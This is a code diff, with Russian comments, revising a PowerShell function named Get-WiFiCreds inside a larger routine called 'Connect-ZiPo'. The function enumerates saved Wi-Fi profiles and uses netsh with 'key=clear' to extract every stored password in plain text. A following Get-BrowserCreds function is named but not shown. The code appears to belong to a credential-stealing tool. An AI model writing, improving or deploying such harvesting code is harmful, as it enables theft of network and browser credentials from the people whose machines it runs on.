@@ -86,42 +86,36 @@ function Connect-ZiPo {
 
    function Get-WiFiCreds {
     try {
-        # Получаем вывод команды с профилями Wi-Fi в виде строки
-        $profilesOutput = cmd /c "netsh wlan show profiles" | Out-String
+        # Вызываем netsh с принудительной сменой кодовой страницы
+        $profilesOutput = cmd /c "chcp 65001 >nul & netsh wlan show profiles" | Out-String
 
-        # Разбиваем вывод на строки и ищем строки, содержащие название профиля.
-        # Здесь учитываются как английские, так и русские надписи.
+        # Ищем нужные строки с названиями профилей
         $profileLines = $profilesOutput -split "`r?`n" | Where-Object {
-            $_ -match "All User Profile\s*:" -or $_ -match "Все профили пользователей\s*:"
+            $_ -match "All User Profile" -or $_ -match "Все профили пользователей"
         }
 
         if (-not $profileLines) {
-            return "[INFO] Wi-Fi профили не найдены (адаптер может быть отключен или недоступен)."
+            return "[INFO] No Wi-Fi profiles found."
         }
 
         $results = "Wi-Fi Credentials:`n"
         foreach ($line in $profileLines) {
-            # Разбиваем строку по символу двоеточия и берем вторую часть
-            $parts = $line -split ":", 2
-            if ($parts.Count -lt 2) {
-                continue
-            }
+            $parts   = $line -split ":", 2
             $wifiName = $parts[1].Trim()
-            $results += "`n[$wifiName]`n"
+            $results += "`nSSID: $wifiName`n"
 
-            # Формируем команду для получения подробной информации по профилю с экранированием кавычек
-            $command = "netsh wlan show profile name=`"$wifiName`" key=clear"
-            $profileDetails = cmd /c $command | Out-String
+            # Для каждого профиля та же схема
+            $detailsCmd = "chcp 65001 >nul & netsh wlan show profile name=""$wifiName"" key=clear"
+            $details = cmd /c $detailsCmd | Out-String
 
-            # Разбиваем вывод по строкам и ищем строку с ключом (паролем)
-            $keyLine = $profileDetails -split "`r?`n" | Where-Object {
+            $keyLine = $details -split "`r?`n" | Where-Object {
                 $_ -match "Key Content" -or $_ -match "Содержимое ключа"
             }
 
             if ($keyLine) {
-                # Извлекаем всё после двоеточия, очищаем от лишних пробелов
-                $keyContent = ($keyLine -replace ".*:\s*", "").Trim()
-                $results += "Пароль: $keyContent`n"
+                # Извлекаем то, что после двоеточия
+                $key = ($keyLine -replace ".*:\s*", "").Trim()
+                $results += "Пароль: $key`n"
             }
             else {
                 $results += "Пароль не найден`n"
@@ -130,10 +124,9 @@ function Connect-ZiPo {
         return $results
     }
     catch {
-        return "[ERROR] Ошибка при получении Wi-Fi паролей: $($_.Exception.Message)"
+        return "[ERROR] " + $_.Exception.Message
     }
 }
-
 
 
     function Get-BrowserCreds {
